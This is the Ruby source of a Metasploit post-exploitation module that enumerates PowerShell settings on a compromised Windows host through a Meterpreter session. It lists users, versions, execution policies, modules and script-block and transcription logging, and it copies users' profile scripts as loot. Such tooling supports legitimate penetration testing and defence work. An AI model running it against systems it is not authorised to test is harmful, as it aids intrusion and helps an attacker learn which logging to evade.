##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather Powershell Environment Setting Enumeration',
        'Description'   => %q{ This module will enumerate Microsoft Powershell settings },
        'License'       => BSD_LICENSE,
        'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
  end

  # Enumerate users on the target box.
  #-----------------------------------------------------------------------
  def enum_users
    os = sysinfo['OS']
    users = []
    user = session.sys.config.getuid
    path4users = ""
    env_vars = session.sys.config.getenvs('SystemDrive', 'USERNAME')
    sysdrv = env_vars['SystemDrive']

    if os =~ /Windows 7|Vista|2008|2012|2016|8|10/
      path4users = sysdrv + "\\Users\\"
      profilepath = "\\Documents\\WindowsPowerShell\\"
    else
      path4users = sysdrv + "\\Documents and Settings\\"
      profilepath = "\\My Documents\\WindowsPowerShell\\"
    end

    if is_system?
      print_status("Running as SYSTEM extracting user list..")
      session.fs.dir.foreach(path4users) do |u|
        userinfo = {}
        next if u =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
        userinfo['username'] = u
        userinfo['userappdata'] = path4users + u + profilepath
        users << userinfo
      end
    else
      userinfo = {}
      uservar = env_vars['USERNAME']
      userinfo['username'] = uservar
      userinfo['userappdata'] = path4users + uservar + profilepath
      users << userinfo
    end
    return users
  end
  # Enumerate the PowerShell version.
  #-----------------------------------------------------------------------
  def enum_version
    if registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\").include?("3")
        powershell_version = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine","PowerShellVersion")
      else
        powershell_version = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine","PowerShellVersion")
      end

      print_good("Version: #{powershell_version}")
      report_note(
        :host   => session,
        :type   => 'host.ps.version',
        :data   => { :version => powershell_version },
        :update => :unique_data
      )
      return powershell_version
  end

  # Enumerate the ExecutionPolicy in place for User and Machine.
  #-----------------------------------------------------------------------
  def enum_execpolicy
    # Enumerate the machine policy
    begin
      powershell_machine_policy = registry_getvaldata("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell","ExecutionPolicy")
    rescue
      powershell_machine_policy = "Restricted"
    end

    # Enumerate the User Policy
    begin
      powershell_user_policy = registry_getvaldata("HKCU\\Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell","ExecutionPolicy")
    rescue
      powershell_user_policy = "Restricted"
    end
      print_good("Current User Execution Policy: #{powershell_user_policy}")
      print_good("Machine Execution Policy: #{powershell_machine_policy}")
      report_note(
        :host   => session,
        :type   => 'host.ps.execpol.user',
        :data   => { :execpol => powershell_user_policy },
        :update => :unique_data
      )
      report_note(
        :host   => session,
        :type   => 'host.ps.execpol.machine',
        :data   => { :execpol => powershell_machine_policy },
        :update => :unique_data
      )
  end

  #-----------------------------------------------------------------------

  def enum_pssnapins
    powershell_path = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell","Path")
      print_status("Path: #{powershell_path}")
      if registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1").include?("PowerShellSnapIns")
        print_status("Powershell Snap-Ins:")
        registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellSnapIns").each do |si|
          print_status("\tSnap-In: #{si}")
          registry_enumvals("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellSnapIns\\#{si}").each do |v|
            print_status("\t\t#{v}: #{registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellSnapIns\\#{si}",v)}")
          end
        end
      else
        print_status("No PowerShell Snap-Ins are installed")

      end
  end

  # Enumerate all modules found and the  path where they where found.
  #-----------------------------------------------------------------------
  def enum_modules(powershell_version, users)
    if not powershell_version =~ /1./
      print_status("Powershell Modules:")
      powershell_module_path = session.sys.config.getenv('PSModulePath').split(";")
      powershell_module_path.each do |mpath|
        print_good("Enumerating modules at #{mpath}")
        modules_found = []
        session.fs.dir.foreach(mpath) do |m|
          next if m =~ /^(\.|\.\.)$/
          print_good("\t#{m}")
          modules_found << m
        end
        if modules_found.count > 0
          report_note(
            :host   => session,
            :type   => 'host.ps.modules',
            :data   => { :path => mpath,
                         :modules => modules_found },
            :update => :unique_data
          )
        end
      end

      users.each do |u|
        # check if the user has a PowerShell  env setup
        users_mod_path = "#{u['userappdata']}\\Modules"
        if exist?(users_mod_path)
          print_good("Enumerating modules at #{users_mod_path}")
          modules_found = []
          session.fs.dir.foreach(users_mod_path) do |m|
            next if m =~ /^(\.|\.\.)$/
            print_good("\t#{m}")
            modules_found << m
          end
          if modules_found.count > 0
            report_note(
              :host   => session,
              :type   => 'host.ps.modules',
              :data   => { :path => users_mod_path,
                           :modules => modules_found },
              :update => :unique_data
            )
          end
        end
      end
    end
  end

  # Enumerate the profile scripts present and save a copy in loot.
  #-----------------------------------------------------------------------
  def enum_profiles(users)
    tmpout = []
    print_status("Checking if users have Powershell profiles")
    users.each do |u|
      print_status("Checking #{u['username']}")
      begin
        session.fs.dir.foreach(u["userappdata"]) do |p|
          next if p =~ /^(\.|\.\.)$/
          if p =~ /Microsoft.PowerShell_profile.ps1|profile.ps1/i
            ps_profile = session.fs.file.new("#{u["userappdata"]}#{p}", "rb")
            until ps_profile.eof?
              tmpout << ps_profile.read
            end
            ps_profile.close
            if tmpout.length == 1
              print_status("Profile #{p} for #{u["username"]} not empty, it contains:")
              tmpout.each do |l|
                print_line("\t#{l.strip}")
              end
              store_loot("powershell.profile",
                "text/plain",
                session,
                tmpout,
                "#{u["username"]}_#{p}.txt",
                "PowerShell Profile for #{u["username"]}")
            end
          end
        end
      rescue
      end
    end
  end

  # Enumerate the logging settings introduced in PowerShell 4.0
  #-----------------------------------------------------------------------
  def enum_logging(powershell_version)
    if powershell_version.to_i > 3
      mod_log_path = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging"
      script_log_path = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging"
      transcript_log_path = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription"
      win_pol_path = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows"

      print_status('Checking for logging.')
      if registry_enumkeys(win_pol_path).include?("PowerShell")

        # Check if module loging is enabled
        log_types = registry_enumkeys("#{win_pol_path}\\PowerShell")
        if log_types.include?('ModuleLogging')
          print_status('Module logging configured.')
          mod_log_val = registry_getvaldata( mod_log_path, "EnableModuleLogging" )
          if mod_log_val == 1
            print_good('Module logging is enabled')

            # Check if specific modules are being logged and if they are enum their names.
            if registry_enumkeys(mod_log_path).include?('ModuleNames')
              modnames = []
              registry_enumvals("#{mod_log_path}\\ModuleNames").each do |mname|
                print_good("\tModule: #{mname}")
                modnames << mname
              end
              report_note(
                :host   => session,
                :type   => 'host.log.ps_module',
                :data   => {
                  :enabled => true,
                  :modules => modnames},
                :update => :unique_data
              )
            end
          else
            print_good('Module logging is disabled')
            report_note(
              :host   => session,
              :type   => 'host.log.ps_module',
              :data   => {
                :enabled => false,
                :modules => []},
              :update => :unique_data
            )
          end
        end

        # Check if script block loging is enabled
        if log_types.include?('ScriptBlockLogging')
          print_status('ScriptBlock logging configured.')
          sb_settings = registry_enumvals(script_log_path)
          if sb_settings.include?('EnableScriptBlockLogging')
            block_log = registry_getvaldata(script_log_path,'EnableScriptBlockLogging')
            if block_log == 1
              print_good("\tScript block logging is enabled.")
              report_note(
                :host   => session,
                :type   => 'host.log.ps_scriptblock',
                :data   => {
                  :enabled => true},
                :update => :unique_data
              )
            else
              print_good("\tScript block logging is disabled.")
              report_note(
                :host   => session,
                :type   => 'host.log.ps_scriptblock',
                :data   => {
                  :enabled => false},
                :update => :unique_data
              )
            end
          end

          if sb_settings.include?('EnableScriptBlockInvocationLogging')
            invoke_block_log = registry_getvaldata(script_log_path,'EnableScriptBlockInvocationLogging')
            if invoke_block_log == 1
              print_good("\tScript block invocation logging is enabled.")
              report_note(
                :host   => session,
                :type   => 'host.log.ps_scriptblockinvocation',
                :data   => {
                  :enabled => true},
                :update => :unique_data
              )
            else
              print_good("\tScript block invocation logging is disabled.")
              report_note(
                :host   => session,
                :type   => 'host.log.ps_scriptblockinvocation',
                :data   => {
                  :enabled => false},
                :update => :unique_data
              )
            end
          end
        end
        # Check if transcription loging is enabled.
        if log_types.include?('Transcription')
          print_status('Transcript configured.')
          transcript_settings = registry_enumvals(transcript_log_path)
          if transcript_settings.include?('EnableTranscripting')
            if registry_getvaldata(transcript_log_path, 'EnableTranscripting') == 1
              print_good("\tTrascript logging is enabled.")
              report_note(
                :host   => session,
                :type   => 'host.log.ps_transcript',
                :data   => {
                  :enabled => true},
                :update => :unique_data
              )
              if transcript_settings.include?('EnableInvocationHeader')
                if registry_getvaldata(transcript_log_path, 'EnableInvocationHeader') == 1
                  print_good("\tInvokation header is enabled for transcript.")
                  report_note(
                    :host   => session,
                    :type   => 'host.log.ps_transcript_invocationheader',
                    :data   => {
                      :enabled => true},
                    :update => :unique_data
                  )
                else
                  print_good("\tInvokation header is not enabled for transcript.")
                  report_note(
                    :host   => session,
                    :type   => 'host.log.ps_transcript_invocationheader',
                    :data   => {
                      :enabled => false},
                    :update => :unique_data
                  )
                end
              end

              if transcript_settings.include?('OutputDirectory')
                transcript_loc = registry_getvaldata(transcript_log_path, 'OutputDirectory')
                if transcript_loc.length > 0
                print_good("\tTrascripts are saved to #{transcript_loc}")
                report_note(
                  :host   => session,
                  :type   => 'host.log.ps_transcript_alt_location',
                  :data   => {
                    :location => transcript_loc},
                  :update => :unique_data
                )
                else
                  print_good("\tTranscript is saved in users Documents folder.")
                end
              else
                print_good("\tTranscript is saved in users Documents folder.")
              end

            else
              print_good("\tTrascript logging is not enabled.")
              report_note(
                :host   => session,
                :type   => 'host.log.ps_transcript',
                :data   => {
                  :enabled => false},
                :update => :unique_data
              )
            end
          else
            print_good("\tTrascript logging is not enabled.")
            report_note(
              :host   => session,
              :type   => 'host.log.ps_transcript',
              :data   => {
                :enabled => false},
              :update => :unique_data
            )
          end
        end
      end
    end
  end

  #-----------------------------------------------------------------------
  def check_ps2enabled
    os = sysinfo['OS']
    if os =~ /Windows 2012|2016|8|10/
      print_status('Checking if PSv2 engine is enabled.')
      path = "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1"
      if registry_enumkeys(path).include?("PowerShellEngine")
        if registry_getvaldata("#{path}\\PowerShellEngine", 'PowerShellVersion') == '2.0'
          print_good("\tPowerShell 2.0 engine feature is enabled.")
          report_note(
            :host   => session,
            :type   => 'host.log.ps_v2_feature',
            :data   => {
              :enabled => true},
            :update => :unique_data
          )
        else
          print_good("\tPowerShell 2.0 engine feature is not enabled.")
          report_note(
            :host   => session,
            :type   => 'host.log.ps_v2_feature',
            :data   => {
              :enabled => false},
            :update => :unique_data
          )
        end
      end
    end
  end

  #-----------------------------------------------------------------------
  def enum_powershell
    #Check if PowerShell is Installed
    if registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\").include?("PowerShell")
      print_status("Powershell is Installed on this system.")
      users = enum_users
      powershell_version = enum_version
      enum_execpolicy
      enum_pssnapins
      enum_modules(powershell_version, users)
      enum_profiles(users)
      enum_logging(powershell_version)
      check_ps2enabled
    end
  end
  #-----------------------------------------------------------------------
  # Run Method
  def run
    print_status("Running module against #{sysinfo['Computer']}")
    enum_powershell
  end
end
